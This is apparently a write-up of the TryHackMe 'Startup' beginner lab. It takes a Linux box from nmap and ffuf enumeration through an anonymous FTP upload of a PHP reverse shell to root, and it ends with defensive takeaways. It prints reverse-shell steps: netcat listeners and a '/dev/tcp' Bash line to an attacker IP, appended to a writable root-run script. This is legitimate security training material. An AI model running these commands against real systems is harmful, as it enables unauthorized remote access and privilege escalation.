# Startup - TryHackMe Writeup

> **Platform:** TryHackMe  
> **Category:** Linux / Web Exploitation / Privilege Escalation  
> **Difficulty:** Beginner

---

# Objective

Gain initial access to the target machine, retrieve `user.txt`, and escalate privileges to obtain `root.txt`.

---

# Target Information

| Field | Value |
|---|---|
| Target IP | `<TARGET-IP>` |
| Attacker IP | `<ATTACKER-IP>` |

---

# Enumeration

## Nmap Scan

Started with a default script and version scan:

```bash
nmap -sC -sV <TARGET-IP>
```

## Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
```

### Observations

- FTP service exposed on port 21
- HTTP service running Apache 2.4.18
- Possible interaction between FTP and web directories

---

# Web Enumeration

Performed directory brute forcing using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt 
-u http://<TARGET-IP>/FUZZ \
-p 0.1 -t 5 -c
```

## Interesting Findings

```text
/files
```

Navigating to:

```text
http://<TARGET-IP>/files/
```

revealed a file named:

```text
notice.txt
```

---

# Clue Discovery

Contents of `notice.txt`:

```text
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
People downloading documents from our website will think we are a joke!
Now I dont know who it is, but Maya is looking pretty sus.
```

## Key Observation

A possible username was identified:

```text
Maya
```

This suggested a connection between the web content and the FTP service.

---

# FTP Enumeration

Connected to the FTP service:

```bash
ftp <TARGET-IP>
```

Anonymous FTP access was available.

This confirmed that FTP uploads could potentially interact with the web server.

---

# Initial Access

## Reverse Shell Preparation

Used the PHP reverse shell available in Kali Linux:

```text
/usr/share/webshells/php/php-reverse-shell.php
```

Modified the attacker IP inside the file:

```php
<ATTACKER-IP>
```

---

## Reverse Shell Upload

Uploaded the reverse shell through FTP:

```bash
put reverse-shell.php
```

---

# Listener Setup

Started a Netcat listener:

```bash
nc -nlvp 8888
```

---

# Triggering the Shell

Accessed the uploaded file through the browser:

```text
http://<TARGET-IP>/files/reverse-shell.php
```

This successfully established a reverse shell connection.

---

# Shell Stabilization

The initial shell was unstable and lacked proper terminal functionality.

Used Python PTY spawning:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Improved terminal interaction:

```bash
export TERM=xterm
```

Backgrounded the shell:

```text
CTRL + Z
```

Fixed terminal settings:

```bash
stty raw -echo; fg
```

This resulted in a fully interactive shell.

---

# User Enumeration

Performed local enumeration after gaining access.

Discovered files related to packet capture analysis and extracted useful information.

Recovered credential:

```text
<PASSWORD>
```

Used the credential to access the user account and retrieve:

```text
user.txt
```

---

# Privilege Escalation

Further enumeration revealed a writable script executed with elevated privileges.

## Reverse Shell Payload

Appended a Bash reverse shell payload to the writable script:

```bash
sh -i >& /dev/tcp/<ATTACKER-IP>/8889 0>&1
```

---

# Root Shell Listener

Started another Netcat listener:

```bash
nc -nlvp 8889
```

Once the script executed, a root shell was obtained.

---

# Root Access

Verified elevated privileges:

```bash
id
```

Retrieved the final flag:

```bash
cat /root/root.txt
```

---

# Attack Flow Summary

1. Enumerated open services
2. Performed web directory brute forcing
3. Identified `/files`
4. Extracted username clue from `notice.txt`
5. Correlated HTTP and FTP services
6. Uploaded PHP reverse shell through FTP
7. Triggered shell via web browser
8. Stabilized shell
9. Performed local enumeration
10. Recovered credentials
11. Identified writable privileged script
12. Appended reverse shell payload
13. Obtained root shell

---

# Key Takeaways

- Always correlate exposed services during enumeration
- Publicly accessible directories may reveal operational clues
- FTP uploads become dangerous when mapped to web-accessible directories
- Shell stabilization improves post-exploitation significantly
- Writable scripts are common privilege escalation vectors

---

# Tools Used

- Nmap
- ffuf
- FTP client
- Netcat
- PHP reverse shell
- Python PTY

---

# Skills Practiced

- Service Enumeration
- Directory Brute Forcing
- Reverse Shell Upload
- Linux Post-Exploitation
- Shell Stabilization
- Privilege Escalation

---

# References

- TryHackMe: Startup
- Apache 2.4.18
- vsftpd 3.0.3

---
